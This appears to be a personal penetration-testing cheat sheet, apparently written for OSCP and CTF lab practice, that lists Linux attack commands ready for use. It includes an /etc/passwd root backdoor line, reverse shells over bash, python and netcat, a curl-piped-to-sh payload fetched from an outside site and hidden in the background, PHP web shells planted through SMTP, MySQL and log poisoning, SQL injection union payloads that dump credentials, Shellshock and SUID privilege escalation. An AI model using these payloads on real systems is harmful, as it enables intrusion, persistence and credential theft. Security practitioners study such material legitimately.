---
title: Linux Cybersec Notes
author:
  name: Wrathdemon
  link: https://github.com/prabhatjoshi321
date: 2022-01-07 15:40:00 +0800
categories: [OSCP, Instructions, Notes]
tags: [writing]    # TAG names should always be lowercase
---

### For binary specific tasks
```
sudo -l

see for the sudo entries for the user that sre allowed to execute binaries as sudo and check for entries on

	https://gtfobins.github.io/

search for that particular binary and use the suggested method there.

```

#### Persistence can be obtained by making entries in /etc/passwd file, do the following
```

echo "realize:drkhtmpyc4URU:0:0:root:/root:/bin/bash" >> /etc/passwd

This will give persistence via ssh as user realize while password being 1234
```

### reverse shell techniques

##### Automated Method
```
on local machine
fire up netcat with tags -lvnp and port [any]

	nc -lvnp [port]

on attack machine execute

	https://reverse-shell.sh/[local-ip]:[local-port]

for recursive call, do this

	while true; do curl https://reverse-shell.sh/[local-ip]:[local-port] | sh; done

for no traces on network scanners or any trace od some shell open, do this

	sh -c "curl https://reverse-shell.sh/localhost:1337 | sh -i &" && exit

this will exit the shell while running the script recursively in background

this will give a reverse shell, it works as someone has hosted a website with raw ascii bash script containing 4 reverse shell methods.
- python2
- netcat
- perl
- sh

```

##### Manual methods
```
until I learn the scripts, following manual method works,

go to
	https://www.revshells.com/
make the appropriate entries and tryout appropriate snippets
```

#### Stabilize the reverse shell by the following methods
```
python -c 'import pty;pty.spawn("/bin/bash")'
export SHELL=/bin/bash
export TERM=xterm-256color

```

#### restricted shell bypass
```
in a restricted shell condition, there apre few binaries that are used there, to bypass the fuckery of restricted shells, do the following

for [echo]
	echo os.system('/bin/bash')

for [exec]
	exec "/bin/sh";

for [perl]
	perl -e 'exec "/bin/sh";'

direct from ssh with aachine having netcat
	ssh [attack-user]@[attack-ip] nc [local-ip] [local-port] -e /bin/sh



```

#### SQL Injection
```
works with MySQL
start with
	1' or '1' = '1

if result returns form is vulnerable
try union method

	1' UNION ALL SELECT 1 -- -

see if output cones
if result is null, increase the number till something comes up, the count determines the number of columns

	1' UNION ALL SELECT 1,2,3,4,5,6 -- -

now the column is determined, we will go for other details

	1' UNION ALL SELECT @@version,2,3,4,5,6 -- -
		the above payload will throw up database version

	1' UNION ALL SELECT concat(SCHEMA_NAME),2,3,4,5,6 FROM information_schema.schemata -- -
		the above payload will fetch for database names in information schema database

	1' UNION ALL SELECT concat(TABLE_NAME),2,3,4,5,6 FROM information_schema.TABLES WHERE table_schema='Staff' -- -
		the above query throws up table names in that database

	1' UNION ALL SELECT concat(COLUMN_NAME),2,3,4,5,6 FROM information_schema.COLUMNS WHERE table_name='StaffDetails' -- -
		this throws up the column names by fetching it from information schema database

now we have all the essential information about the database and the table layout
time to dump tables

	1' UNION ALL SELECT group_concat(Username," : ",Password),2,3,4,5,6 FROM users.UserDetails -- -
		this dumps the table




```


##### sometimes ports are locked and we need to perform port knocking by nc
```
config file present at
	/etc/knockd.conf
consists of ports required to knock
```

### Web enumeration
- we can use gobuster as usual but if we are lost or we need more aggressive enumeration, wfuzz is the way to go

### Php shellcode for RCE
```
	after knowing the vulnerable file, if it is vulnerable, inject this and use it for payload

		<?php echo shell_exec($_GET['cmd']); ?>

	if situation for LFI try to get the credentials file
	ls ls

```

## Reverse shell payloads
```
bash (works in all cases)
		bash -i >& /dev/tcp/10.10.10.3/1234 0>&1


python
		python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("192.168.56.107",1234));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("/bin/bash")'

```

### Local shell payload
```

			import os

			os.system('cp /bin/bash /tmp/bash')
			os.system('chmod +s /tmp/bash')

this will create a bash with suid bit set in /tmp folder
		do
			./bash -p
		to get root shell



```

#### RCE through smtp
```
we connect to port 25 via telnet
	telnet [host] [port]

send one mail with the payload
	do as follows
		MAIL FRON: <qewr>
		RCPT TO: Helios
		data
		<?php system($_GET['cmd']); ?>
		.
	now close the terminal

now go to LFI link and give in 1 extra parameter "cmd" like this
	http://symfonos.local/h3l105/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/var/mail/helios&cmd=id

open nc inject reverse shell payload in above link and wait for callback

```

#### Privledge escalation through suid binary and path overriding as binary name was used
```
	echo -n "/bin/sh" > binary
	chmod 755 binary
	export PATH=/tmp:$PATH
	/location/of/suid/binary

```

### Suid binary find
```

  find /opt -perm -u=s -type f 2>/dev/null

```

#### Check for listening ports on the machine
```
	netstat -tulpn
	ss -tulpn

	for ssh port forwarding, 2 nethods are there

		- ssh -L [local-port]:[hosted-remote-ip]:[hosted-remote-port] [remote-user]@[remote-host]
	OR
		- if logged into SSH
			press ENTER   ~   C
		- SSH prompt opens
		- give in the command]
			-L [local-port]:[hosted-remote-ip]:[hosted-remote-port]
		- press enter, port is forwarded, use firefox or any unproxied browser

```

### Shellshock vulnerability
```
inject the following payload into the user agent part of the page and use netcat to get shell


		() { :; }; echo; echo; /bin/bash -c 'cat /etc/passwd'

		 () { :; }; echo; echo; /bin/bash -c '/bin/nc -e /bin/bash 192.168.56.107 4321'


```

### User specific files
```
	find / -user hades 2>/dev/null

```

### To sniff traffic off port
```
	tcpdump -v -i [interface] port [port-no]

```

### LDAP injection through LDAP poisoning
```
	Credentials for login can be * and *

```

### to connect to LDAP via credentials
```
	ldapsearch -x -h symfonos -D "CN=admin,DC=symfonos,DC=local" -w qMDdyZh3cT6eeAWD -b "DC=symfonos,DC=local"

```

### php wrapper to see php pages during LFI
```

	/home.php?url=php://filter/convert.base64-encode/resource=home.php

```

### to sudo with particular user rights
```
	sudo -u [user] /bin/bash

```


#### exploiting python apps for privledge escalation
```
give input as
	eval('__import__("os").system("id")')

```

### find writable directories in the system
```
	find / -perm -2 -type d 2>/dev/null
```

### exploit php command execution vulnerability
```
http://192.168.229.129:8/breach3/thebobscloudhostingllc/livechat.php?searcher=echo'<?php echo shell_exec($_GET['e']); ?>' >test.txt

```

### reverse forward a port through reverse shell
```

on your machine
	chisel server --reverse --port 8000

on attacking machine
	./chisel client 10.14.13.211:8000 R:2049:127.0.0.1:2049

```

### search for a particular string
```
grep -iRl 'pat' /

```


##### directory enumeration is affected by ssl, use appropriate domain before enumeration


#### RCE through mysql queries
```
SELECT "<?php system($_GET['cmd']); ?>" INTO OUTFILE "/var/www/html/wordpress/shell.php"

```


### LFI
##### use php wrappers during lfi to read php specific files that are otherwise unreadable
```

	file=filter/read=string.rot13/resource=/etc/passwd


```

#### log poisoning
```
we can inject malicious payload into popular applications log files and retrieve them through LFI to get RCE
This is log poisoning

change user agent to this

	curl -A "<?php phpinfo();?>" http://10-10-89-133.p.thmlabs.com/login.php
	curl -A "<?php system($_GET['cmd']); ?>" http://10-10-89-133.p.thmlabs.com/login.php
	page link file=/var/log.log&cmd=ifconfig



```

